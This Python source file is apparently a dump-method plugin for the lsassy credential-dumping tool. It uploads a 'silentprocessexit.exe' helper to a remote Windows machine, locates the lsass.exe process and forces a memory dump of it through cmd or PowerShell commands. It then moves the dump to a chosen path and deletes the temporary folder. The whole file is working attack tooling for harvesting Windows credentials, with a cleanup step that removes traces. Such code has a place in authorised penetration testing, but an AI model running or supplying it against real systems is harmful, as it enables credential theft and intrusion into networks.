from lsassy.dumpmethod import IDumpMethod, Dependency


class DumpMethod(IDumpMethod):
    #need_debug_privilege = True


    def __init__(self, session, timeout, time_between_commands):
        super().__init__(session, timeout, time_between_commands)
        self.silentprocessexit = Dependency("silentprocessexit", "silentprocessexit.exe")

    def prepare(self, options):
        return self.prepare_dependencies(options, [self.silentprocessexit])

    def clean(self):
        self.clean_dependencies([self.silentprocessexit])

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        cmd_command = [
	        """for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {} %J 0""".format(
	            self.silentprocessexit.get_remote_path()
	        ),
	        """move C:\\temp\\lsass.exe-(PID-* C:\\Temp\\lsass && move C:\\Temp\\lsass\\lsass.exe*.dmp {}{} """.format(self.dump_path, self.dump_name),
	        """del /s /q "C:\\temp\\lsass" && rmdir C:\\Temp\\lsass"""
        ]
        pwsh_command = [
        	"{} (Get-Process lsass).Id 0".format(
            	self.silentprocessexit.get_remote_path()
            ),
			"""move C:\\temp\\lsass.exe-(PID-* C:\\Temp\\lsass && move C:\\Temp\\lsass\\lsass.exe*.dmp {}{} """.format(self.dump_path, self.dump_name),
	        """del /s /q "C:\\temp\\lsass" && rmdir C:\\Temp\\lsass"""        ]
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
